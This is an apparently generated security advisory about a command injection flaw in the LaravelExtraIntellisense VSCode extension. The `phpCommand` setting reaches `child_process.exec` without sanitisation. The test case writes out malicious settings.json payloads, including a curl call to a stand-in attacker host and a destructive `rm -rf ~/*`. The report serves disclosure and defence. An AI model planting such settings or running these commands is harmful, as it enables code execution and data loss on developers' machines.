### Vulnerability List:

#### 1. Command Injection in `phpCommand` setting

- **Description:**
    1. The `LaravelExtraIntellisense` extension allows users to configure the `phpCommand` setting in VSCode settings. This setting defines the command used to execute PHP code for Laravel project analysis and autocompletion features.
    2. The extension uses `child_process.exec` in `src/helpers.ts` to execute this command, replacing the `{code}` placeholder with dynamically generated PHP code.
    3. The extension does not sanitize the `phpCommand` setting provided by the user.
    4. A threat actor can craft a malicious `phpCommand` within a workspace's settings (e.g., `.vscode/settings.json`) that injects arbitrary shell commands.
    5. When a victim opens a workspace containing this malicious setting and the extension attempts to execute a PHP command (which happens automatically in the background), the injected shell commands are executed.

- **Impact:**
    - Remote Code Execution (RCE).
    - A successful command injection allows the threat actor to execute arbitrary commands on the victim's machine with the same privileges as the VSCode process.
    - This can lead to complete system compromise, data theft, malware installation, or other malicious activities.

- **Vulnerability Rank:** critical

- **Currently Implemented Mitigations:**
    - None. The extension relies on the user-provided `phpCommand` setting without any input sanitization or validation. The "Security Note" in `README.md` warns users about potential issues but does not prevent command injection.

- **Missing Mitigations:**
    - Input sanitization and validation of the `phpCommand` setting.
    - Restricting the allowed characters or commands in the `phpCommand` setting.
    - Using safer methods for executing PHP code, such as programmatically invoking PHP functions within a controlled environment instead of relying on shell execution of arbitrary commands.
    - Display a warning message to the user if the `phpCommand` setting is modified outside of the extension's control (e.g., by workspace settings) and prompt for confirmation.

- **Preconditions:**
    - The victim must have the `LaravelExtraIntellisense` extension installed in VSCode.
    - The victim must open a workspace or project that contains a malicious `.vscode/settings.json` file or has a workspace setting configured to a malicious `phpCommand`.
    - The threat actor needs to convince the victim to open a malicious repository or project.

- **Source Code Analysis:**
    - File: `src/helpers.ts`
        ```typescript
        static async runPhp(code: string, description: string|null = null) : Promise<string> {
            code = code.replace(/\"/g, "\\\"");
            if (['linux', 'openbsd', 'sunos', 'darwin'].some(unixPlatforms => os.platform().includes(unixPlatforms))) {
                code = code.replace(/\$/g, "\\$");
                code = code.replace(/\\\\'/g, '\\\\\\\\\'');
                code = code.replace(/\\\\"/g, '\\\\\\\\\"');
            }
            let commandTemplate = vscode.workspace.getConfiguration("LaravelExtraIntellisense").get<string>('phpCommand') ?? "php -r \"{code}\"";
            let command = commandTemplate.replace("{code}", code);
            let out = new Promise<string>(function (resolve, error) {
                if (description != null) {
                    Helpers.outputChannel?.info("Laravel Extra Intellisense command started: " + description);
                }

                cp.exec(command, // Vulnerable function: child_process.exec
                    { cwd: vscode.workspace.workspaceFolders && vscode.workspace.workspaceFolders.length > 0 ? vscode.workspace.workspaceFolders[0].uri.fsPath : undefined },
                    function (err, stdout, stderr) {
                        if (err == null) {
                            if (description != null) {
                                Helpers.outputChannel?.info("Laravel Extra Intellisense Resolved: " + description);
                            }
                            resolve(stdout);
                        } else {
                            const errorOutput = stderr.length > 0 ? stderr : stdout;
                            Helpers.outputChannel?.error("Laravel Extra Intellisense Error:\n " + (description ?? '') + '\n\n' + errorOutput);
                            Helpers.showErrorPopup();
                            error(errorOutput);
                        }
                    }
                );
            });
            return out;
        }
        ```
        - The `runPhp` function in `helpers.ts` is responsible for executing PHP code.
        - It retrieves the `phpCommand` setting from the VSCode configuration.
        - It replaces the `{code}` placeholder in the `phpCommand` with the `$code` argument.
        - **Vulnerability:** The `command` variable, which is constructed using the user-provided `phpCommand` setting and the `$code`, is directly passed to `cp.exec()`. This allows for command injection if the user provides a malicious `phpCommand`.
        - The code performs minimal escaping (escaping double quotes and backslashes for some platforms), which is insufficient to prevent command injection.

- **Security Test Case:**
    1. **Setup:**
        - Create a new directory for a malicious Laravel project (or any directory that can be opened in VSCode).
        - Inside this directory, create a `.vscode` folder.
        - Inside the `.vscode` folder, create a `settings.json` file.
        - Add the following JSON content to `settings.json` to inject a malicious command:
            ```json
            {
                "LaravelExtraIntellisense.phpCommand": "bash -c 'touch /tmp/pwned_by_laravel_intellisense'"
            }
            ```
        - Alternatively, to demonstrate network access, use:
            ```json
            {
                "LaravelExtraIntellisense.phpCommand": "bash -c 'curl https://attacker.example.com/pwned'"
            }
            ```
        - Or to execute more complex commands:
            ```json
            {
                "LaravelExtraIntellisense.phpCommand": "bash -c 'rm -rf ~/*'"
            }
            ```
            **Warning: Be extremely cautious when testing destructive commands. Test in a safe, isolated environment like a virtual machine.**

    2. **Execution:**
        - Open the directory created in step 1 in VSCode.
        - Ensure the `LaravelExtraIntellisense` extension is activated for this workspace. (It should activate automatically for PHP/Laravel projects).
        - The extension will attempt to run PHP commands in the background to gather autocompletion data. This should trigger the malicious command injected in `phpCommand`.

    3. **Verification:**
        - **For `touch /tmp/pwned_by_laravel_intellisense`:** Check if the file `/tmp/pwned_by_laravel_intellisense` has been created in the `/tmp` directory.
        - **For `curl https://attacker.example.com/pwned`:** Monitor your attacker's web server logs to see if a request to `/pwned` has been received from the victim's machine.
        - **For `rm -rf ~/*` (USE WITH EXTREME CAUTION IN A SAFE VM):** Verify if files in the home directory have been deleted (if you dared to run this, which is strongly discouraged outside of a controlled, isolated test environment).

    4. **Expected Result:**
        - If the test is successful, the injected command will be executed on the victim's system, demonstrating the command injection vulnerability. The file `/tmp/pwned_by_laravel_intellisense` will be created, the attacker's server will receive a request, or (in the destructive example) files may be deleted. This confirms that arbitrary commands can be executed through the `phpCommand` setting.
